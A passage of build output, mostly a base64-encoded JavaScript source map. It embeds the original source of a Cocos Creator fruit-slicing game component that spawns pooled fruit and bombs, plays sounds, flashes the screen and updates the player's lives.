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FBQyxFQUFFLEVBQUU7TUFBRUYsT0FBTyxFQUFFO0lBQUUsQ0FBQyxDQUFDLENBQUNHLElBQUksQ0FBQyxZQUFNO01BQ3ZETCxNQUFJLENBQUMvQyxTQUFTLENBQUNnRCxNQUFNLEdBQUcsS0FBSztJQUNqQyxDQUFDLENBQUMsQ0FBQ0ssS0FBSyxFQUFFO0VBQ2Q7QUFDSixDQUFDLENBQUMiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbImNvbnN0IHV0aWxzID0gcmVxdWlyZSgndXRpbHMnKVxuXG5sZXQgZnJ1aXRHID0gY2MuQ2xhc3Moe1xuICAgIG5hbWU6ICdmcnVpdEcnLFxuICAgIHByb3BlcnRpZXM6IHtcbiAgICAgICAgbmFtZTogJycsXG4gICAgICAgIGluaXRQb29sQ291bnQ6IDEwLFxuICAgICAgICBzY29yZTogMCxcbiAgICAgICAgdHlwZTogJ2ZydWl0JyxcbiAgICAgICAgcHJlZmFiOiBjYy5QcmVmYWIsXG4gICAgfVxufSk7XG5jYy5DbGFzcyh7XG4gICAgZXh0ZW5kcyA6IGNjLkNvbXBvbmVudCxcbiAgICBwcm9wZXJ0aWVzOiB7XG4gICAgICAgIG1heExlbmd0aCA6IDUsXG4gICAgICAgIGZsYXNoTm9kZSA6IGNjLk5vZGUsXG4gICAgICAgIGZydWl0RyA6IHtcbiAgICAgICAgICAgIGRlZmF1bHQgOiBbXSxcbiAgICAgICAgICAgIHR5cGUgOiBmcnVpdEcsXG4gICAgICAgIH0sXG4gICAgICAgIHRocm93Qm9tYiA6IGNjLkF1ZGlvQ2xpcCxcbiAgICB9LFxuICAgIG9uTG9hZCgpIHtcbiAgICAgICAgdGhpcy5nYW1lT2JqID0gdGhpcy5ub2RlLnBhcmVudC5nZXRDb21wb25lbnQoJ0dhbWUnKTtcbiAgICAgICAgLy/lvpfliLDml6DngrjlvLnmlbDnu4TjgIJcbiAgICAgICAgdGhpcy5ub0JvbWJBcnIgPSB0aGlzLmZydWl0Ry5maWx0ZXIoYSA9PiBhLnR5cGUgPT0gJ2ZydWl0Jyk7XG4gICAgICAgIHV0aWxzLmJhdGNoSW5pdE9ialBvb2wodGhpcywgdGhpcy5mcnVpdEcpO1xuICAgIH0sXG4gICAgLy/liJvlu7rmsLTmnpzjgIJcbiAgICBjcmVhdGVGcnVpdExpc3QoKSB7XG4gICAgICAgIGxldCB0b3RhbEZyID0gdGhpcy5mcnVpdEc7XG4gICAgICAgIC8v6I635Y+W5rC05p6c55qE6ZqP5py65pWw44CCXG4gICAgICAgIGxldCByYW5kb21MZW5ndGggPSBNYXRoLmZsb29yKHV0aWxzLnJhbmRvbSgxLCB0aGlzLm1heExlbmd0aCArIDAuNCkpO1xuICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IHJhbmRvbUxlbmd0aDsgaSsrKSB7XG4gICAgICAgICAgICAvL3JhbuS4uuawtOaenOeahOmaj+acuuenjeexu++8jGZydWl06KGo56S65rC05p6c77yMcG9vbE5hbWXliJnkuLrmsLTmnpzlr7nlupTnmoTlr7nosaHmsaDjgIJcbiAgICAgICAgICAgIGxldCByYW4gPSAwLGZydWl0LCBwb29sTmFtZTtcbiAgICAgICAgICAgIHJhbiA9IE1hdGguZmxvb3IoTWF0aC5mbG9vcih1dGlscy5yYW5kb20oMCwgdG90YWxGci5sZW5ndGggLSAwLjEpKSk7XG4gICAgICAgICAgICBmcnVpdCA9IHRvdGFsRnJbcmFuXTtcbiAgICAgICAgICAgIHBvb2xOYW1lID0gZnJ1aXQubmFtZSArICdQb29sJztcbiAgICAgICAgICAgIC8v55Sf5oiQ5a+56LGh44CCXG4gICAgICAgICAgICBsZXQgZnJ1aXROb2RlID0gdXRpbHMuZ2VuTmV3Tm9kZSh0aGlzW3Bvb2xOYW1lXSwgZnJ1aXQucHJlZmFiLCB0aGlzLm5vZGUpO1xuICAgICAgICAgICAgLy/orr7nva7lhbbpmo/mnLrlh7rnjrDkvY3nva7jgIJcbiAgICAgICAgICAgIGZydWl0Tm9kZS5zZXRQb3NpdGlvbihjYy52Mih1dGlscy5yYW5kb20oLXRoaXMubm9kZS53aWR0aCAvIDIgKyBcbiAgICAgICAgICAgICAgICBmcnVpdE5vZGUud2lkdGggLyAyLCB0aGlzLm5vZGUud2lkdGggLyAyIC0gZnJ1aXROb2RlLndpZHRoIC8gMiksXG4gICAgICAgICAgICAgICAgICAgIC0odGhpcy5ub2RlLmhlaWdodCAvIDIgLSBmcnVpdE5vZGUuaGVpZ2h0IC8gMikpKTtcbiAgICAgICAgICAgIC8v5Yid5aeL5YyW5rC05p6c54q25oCB44CCXG4gICAgICAgICAgICBmcnVpdE5vZGUuZ2V0Q29tcG9uZW50KFwiRnJ1aXRcIikuaW5pdChwb29sTmFtZSwgZnJ1aXQuc2NvcmUpO1xuICAgICAgICAgICAgLy/liKTmlq3mmK/kuI3mmK/ngrjlvLnvvIzlpoLmnpzmmK/ngrjlvLnvvIzmiJHku6zlsLHlsIblhbborr7nva7kuLrml6DngrjlvLnnmoTmlbDnu4TvvIznoa7kv53lj6rlh7rnjrDkuIDkuKrngrjlvLnjgIJcbiAgICAgICAgICAgIGlmIChmcnVpdC50eXBlID09ICdib21iJykge1xuICAgICAgICAgICAgICAgIC8v5piv54K45by577yM5pKt5pS+54K45by55omU5LiK5p2l55qE6Z+z5pWI44CCXG4gICAgICAgICAgICAgICAgY2MuYXVkaW9FbmdpbmUucGxheSh0aGlzLnRocm93Qm9tYiwgZmFsc2UsIDEpO1xuICAgICAgICAgICAgICAgIHRvdGFsRnIgPSB0aGlzLm5vQm9tYkFycjtcbiAgICAgICAgICAgIH07XG4gICAgICAgIH07XG4gICAgfSxcbiAgICAvL+ajgOafpeaYr+WQpuacieWJqeS9meeahOawtOaenOOAglxuICAgIGNoZWNrUmVtYWluKCkge1xuICAgICAgICAvL+WIpOaWrea4uOaIj+aYr+WQpue7k+adn+OAglxuICAgICAgICBpZiAodGhpcy5nYW1lT2JqLmdhbWVPdmVyKSByZXR1cm47XG4gICAgICAgIGxldCBjaGlsZHJlbkxlbmd0aCA9IHRoaXMubm9kZS5jaGlsZHJlbi5sZW5ndGg7XG4gICAgICAgIGlmIChjaGlsZHJlbkxlbmd0aCA9PSAwKSB7XG4gICAgICAgICAgICAvL+WmguaenOayoeacieS6hu+8jOWwsee7p+e7reeUn+aIkOOAglxuICAgICAgICAgICAgdGhpcy5zY2hlZHVsZU9uY2UoKCkgPT4ge1xuICAgICAgICAgICAgICAgIHRoaXMuY3JlYXRlRnJ1aXRMaXN0KClcbiAgICAgICAgICAgIH0sIC41LCB0aGlzKVxuICAgICAgICB9XG4gICAgfSxcbiAgICAvLyDliIfliLDngrjlvLkgXG4gICAgY3V0Qm9tYlJlbW92ZUFsbENoaWxkcmVuKCkge1xuICAgICAgICAvL+aSreaUvueCuOW8uemXqueDgeeJueaViOOAglxuICAgICAgICB0aGlzLmZsYXNoU2NyZWVuKCk7XG4gICAgICAgIC8v6I635Y+W5Ymp5LiL55qE5rC05p6c44CCXG4gICAgICAgIGxldCBjaGlsZE9iakFyciA9IHRoaXMubm9kZS5jaGlsZHJlbi5tYXAoKGEpID0+IHtcbiAgICAgICAgICAgIHJldHVybiBhLmdldENvbXBvbmVudChcIkZydWl0XCIpXG4gICAgICAgIH0pO1xuICAgICAgICAvL+WwhuWJqeS4i+eahOawtOaenOWbnuaUtuOAglxuICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGNoaWxkT2JqQXJyLmxlbmd0aDsgaSsrKSB7XG4gICAgICAgICAgICBjaGlsZE9iakFycltpXS5iYWNrVGhpc05vZGUodHJ1ZSk7XG4gICAgICAgIH07XG4gICAgICAgIC8v5pu05paw5ri45oiP55WM6Z2i5ZKM55Sf5ZG95oOF5Ya144CCXG4gICAgICAgIHRoaXMuZ2FtZU9iai5saWZlQ29uc3VtZSgpO1xuICAgICAgICB0aGlzLmdhbWVPYmoudXBEYXRlVWkoKTtcbiAgICAgICAgLy/lpoLmnpzmuLjmiI/msqHmnInnu5PmnZ/vvIznu6fnu63liJvlu7rjgIJcbiAgICAgICAgaWYgKCF0aGlzLmdhbWVPYmouZ2FtZU92ZXIpIHtcbiAgICAgICAgICAgIHRoaXMuc2NoZWR1bGVPbmNlKCgpID0+IHtcbiAgICAgICAgICAgICAgICB0aGlzLmNyZWF0ZUZydWl0TGlzdCgpXG4gICAgICAgICAgICB9LCAwLjUsIHRoaXMpXG4gICAgICAgIH1cbiAgICB9LFxuICAgIC8v6Zeq5bGP54m55pWI44CCXG4gICAgZmxhc2hTY3JlZW4oKSB7XG4gICAgICAgIHRoaXMuZmxhc2hOb2RlLmFjdGl2ZSA9IHRydWU7XG4gICAgICAgIHRoaXMuZmxhc2hOb2RlLm9wYWNpdHkgPSAyMzA7XG4gICAgICAgIC8v5L2/55So5riQ5Y+Y5pWI5p6c5a6e546w44CCXG4gICAgICAgIGNjLnR3ZWVuKHRoaXMuZmxhc2hOb2RlKS50byguOCwgeyBvcGFjaXR5OiAwIH0pLmNhbGwoKCkgPT4ge1xuICAgICAgICAgICAgdGhpcy5mbGFzaE5vZGUuYWN0aXZlID0gZmFsc2U7XG4gICAgICAgIH0pLnN0YXJ0KClcbiAgICB9XG59KTsiXX0=
//------QC-SOURCE-SPLIT------
